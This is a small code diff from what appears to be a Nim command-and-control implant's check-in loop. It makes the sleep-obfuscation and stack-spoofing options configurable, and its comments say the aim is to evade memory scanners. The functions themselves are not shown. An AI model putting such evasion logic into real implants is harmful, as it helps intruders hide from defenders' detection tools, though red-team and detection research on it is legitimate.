@@ -34,10 +34,8 @@ proc main() =
     ]#
 
     while true: 
-
-        # Sleep obfuscation with stack spoofing to evade memory scanners
-        var spoof = true
-        sleepObfuscate(ctx.sleep * 1000, spoofStack = spoof)
+        # Sleep obfuscation to evade memory scanners
+        sleepObfuscate(ctx.sleep * 1000, ctx.sleepTechnique, ctx.spoofStack)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo "\n", fmt"[*] [{date}] Checking in."
